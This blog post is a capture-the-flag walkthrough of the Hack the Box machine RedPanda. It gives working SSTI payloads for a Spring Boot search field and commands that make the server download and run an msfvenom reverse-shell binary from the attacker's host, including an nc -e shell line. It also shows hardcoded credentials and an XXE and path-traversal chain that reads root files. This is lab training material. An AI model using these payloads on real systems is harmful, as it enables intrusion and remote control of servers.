+++
author = "Nick"
categories = ["hack the box", "Easy"]
date = 2023-11-26T11:00:00.000Z
publishDate = 2023-11-26T11:00:00.000Z
description = ""
draft = false
thumbnail = "/images/redpanda/logo.png"
slug = "hack-the-box-redpanda"
summary = ""
tags = ["hack the box", "Easy", "Linux", "Burpsuite", "LFI", "XXE", "Java"]
title = "Hack the Box - RedPanda"
url = "/hack-the-box-redpanda"
+++

Welcome! Today we are going to be doing the same thing we do every week... Try and take over the world!... errr, I mean, Hack the Box. This week's Hack the Box machine is Redpanda. This is a listed as an easy Linux machine.

As usual, we start with an `nmap` scan. Here are the results:

```
Host is up (0.072s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Wed, 05 Oct 2022 11:54:04 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Wed, 05 Oct 2022 11:54:04 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Wed, 05 Oct 2022 11:54:04 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-title: Red Panda Search | Made with Spring Boot
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=10/5%Time=633D705F%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,690,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;charse
SF:t=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Wed,\x2005\x20Oct\x20
SF:2022\x2011:54:04\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20htm
SF:l>\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x20\x20\
SF:x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20author=\"woode
SF:n_k\">\n\x20\x20\x20\x20<!--Codepen\x20by\x20khr2003:\x20https://codepe
SF:n\.io/khr2003/pen/BGZdXw\x20-->\n\x20\x20\x20\x20<link\x20rel=\"stylesh
SF:eet\"\x20href=\"css/panda\.css\"\x20type=\"text/css\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"css/main\.css\"\x20type=\"text/c
SF:ss\">\n\x20\x20\x20\x20<title>Red\x20Panda\x20Search\x20\|\x20Made\x20w
SF:ith\x20Spring\x20Boot</title>\n\x20\x20</head>\n\x20\x20<body>\n\n\x20\
SF:x20\x20\x20<div\x20class='pande'>\n\x20\x20\x20\x20\x20\x20<div\x20clas
SF:s='ear\x20left'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='ear\x20r
SF:ight'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='whiskers\x20left'>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x
SF:20\x20\x20<div\x20class='whiskers\x20right'>\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</
SF:div>\n\x20\x20\x20\x20\x20\x20<div\x20class='face'>\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<div\x20class='eye")%r(HTTPOptions,75,"HTTP/1\.1\x20200\x
SF:20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate:\x20We
SF:d,\x2005\x20Oct\x202022\x2011:54:04\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/
SF:html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435
SF:\r\nDate:\x20Wed,\x2005\x20Oct\x202022\x2011:54:04\x20GMT\r\nConnection
SF::\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>H
SF:TTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x2
SF:0type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1
SF:,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x
SF:20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px
SF:;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{heigh
SF:t:1px;background-color:#525D76;border:none;}</style></head><body><h1>HT
SF:TP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html
SF:>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Looks like something is being hosted on `8080`. We'll load up `Burpsuite` and see what it is.

![](/images/redpanda/panda1.png)

Just a page with a search function. We'll toss a `gobuster` at it to start.

Command:
`gobuster dir -u http://10.10.11.170:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

Right off the bat we see two hits `/search` and `/stats`. When we visit the `stats` page we get an option to see stats on an author.

![](/images/redpanda/panda2.png)

Each has a link to an image and the option to export the table via `export.xml`. This is something we might be able to abuse. We also look for `XSS` in the search function but nothing basi really pops out. One thing we do notice is that in the request, we see `Red Panda Search | Made with Spring Boot` as the title tag. A quick Google shows that this is a `Java` based template framework. There were also some other exploits listed but need to test out what we might be working with in the search field. A great place to start is [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Server%20Side%20Template%20Injection/#summary).

![](/images/redpanda/panda3.png)

Now, we see that `#` and `~` do not work with the `{7*7}` tester - but `*` and `@` does. Now from that same page, we see what `*{T(java.lang.System).getenv()}` returns.

![](/images/redpanda/panda4.png)

Well, that works, let's ratchet it up a bit and try to cat `/etc/passwd`. We try with the first sugestion, nothing. Howver the second query works:
 ```
 *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
 ```

Now we need to take this base query and weaponize it. The first thing to try is to slim this down to just the `.exec()` function: `*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec()`. Now we'll simply try to get the command to do a simple `ls`.

Command:
`*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("ls")}` 

Nothing. More searching around lead me [here](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md). This has a bit different method of calling the `Java` methods. 

Now our payload looks like this:
`*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("ls")}`

Well, it didn't return the resutlts I was expecting. It just returned the results of that the command input was valid. That's also fine. This means that we can hopefully setup a `netcat` listener and catch and incoming call from the server. This is very much like the RCE listed in the above repo.

Command:
`*{""["class"].forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("nc 10.10.16.32 9999 -e /bin/sh")}`

Still nothing. So now as we look back through the repo with exploits, we see an instance of the `curl` command being used. So we try that.

Command:
`*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://10.10.16.32:9999")}`

![](/images/redpanda/panda5.png)

That does indeed work. So if we can get the server to `wget` a file from us and then launch it, we can probably catch a shell from that file. First we can generate a payload with `msfvenom`.

Command:
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.32 LPORT=9999 -f elf > pwn.elf`

Now with our payload created, we will host it:

Command:
`python3 -m http.server 80`

Now we will craft the query payload:

Command:
`*{""["class"].forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("wget http://10.10.16.32/pwn.elf")}`

That didn't work due to the `http://` and after some tinkering with the query the `.getMethod().invoke()` need to be removed leaving us with:

Command:
`*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget 10.10.16.32/pwn.elf")}`

We see it get the file!

![](/images/redpanda/panda6.png)

Now we need to execute it on the server. First we change the file permissions.

Command:
`*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./pwn.elf")}`

Now we execute it:

Command:
`*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./pwn.elf")}`

We catch the incomming connection!

![](/images/redpanda/panda7.png)

We can stabalize the shell and get our `user.txt` flag! Now we can start enumerating. We do a quick `sudo -l` then we download a copy of `linpeas` to the system and let it go. As we sift through the results we see an interesting cron job:

![](/images/redpanda/panda8.png)

However, nothing shows on our standard `cron` output. This might be a rabbit hole. To double check we'll run `pspy`. Now as this runs, we don't see the cron job we thought. We do see a script that is deleting xml files.

![](/images/redpanda/panda9.png)

We look a the source of the `cleanup.sh` script and it's doing nothing but removing files. But it does lead me to down a path to `/src/main/java/com/panda_search/htb/panda_search`. Here there are a few files that are very useful. We can see how the `search` function works and why certain characters aren't allowed - but more importantly, we have hardcoded credentials.

![](/images/redpanda/panda10.png)

We see that we now have `woodenk`:`RedPandazRule`. This should allow us to have a more stable connection. We sift through the other files and keep them around for reference. Next up, we're going to try and look through the actual `credit-score` java files to see what we can find there as well. So we head to `/opt/credit-score/LogParser/final/src/main/java/com/logparser` and look through `App.java`. It's here where we have to put it all together. Here is the code from the logparser of interest:

```java
  public static Map parseLog(String line) {
    String[] strings = line.split("\\|\\|");
    Map<Object, Object> map = new HashMap<>();
    map.put("status_code", Integer.valueOf(Integer.parseInt(strings[0])));
    map.put("ip", strings[1]);
    map.put("user_agent", strings[2]);
    map.put("uri", strings[3]);
    return map;
  }

  ...

 public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
            if(!isImage(line))
            {
                continue;
            }
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }

    }
```

We see that it reads the files line by line. The `parselog` map tells us that it will split up our `uri` and that we require an integer to be a valid parse. Then it exports our `xml` to `/credits/`. So now we have an idea of how it functions, we need to break it. If you notice, there is no sanitization on the `Artist` property. This is where we will insert and `LFI`. Then we can chain that with [`XML Entity Expansion`](https://knowledge-base.secureflag.com/vulnerabilities/xml_injection/xml_entity_expansion_java.html#vulnerable-example-1) or `XXE`. So, here are the steps we need. First we need to create a new `.jpg` and upload it to the server. Next we need to create a copy of the current `creds.xml` file to insert our `LFI` and `XXE` into.]

Let's create a new `.jpg`. Then modify the metadata of that file with `exiftool`.

Command:
`exiftool -Artist="../home/woodenk/" pwn.jpg`

Now download it onto the target machine. Next up, creating the `xml` file.

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///root/root.txt"> ]>
<credits>
	<author>damian</author>
	<image>
		<uri>/../../../../../../../home/woodenk/pwn.jpg</uri>
		<qq>&ent;</qq>
		<views>0</views>
	</image>
	<totalviews>0</totalviews>
</credits>
```

Now we can can `echo` a line into the log:

Command:
`echo "../../../../../../home/woodenk/pwn.jpg" > /opt/panda_search/redpanda.log`

I found that this actually only works with a reverse shell vs in `ssh`. Looks like it's due to the group assocaiations. We can then go back and cat our `xml` file.

![](/images/redpanda/panda11.png)

There we have it, our `root.txt` flag!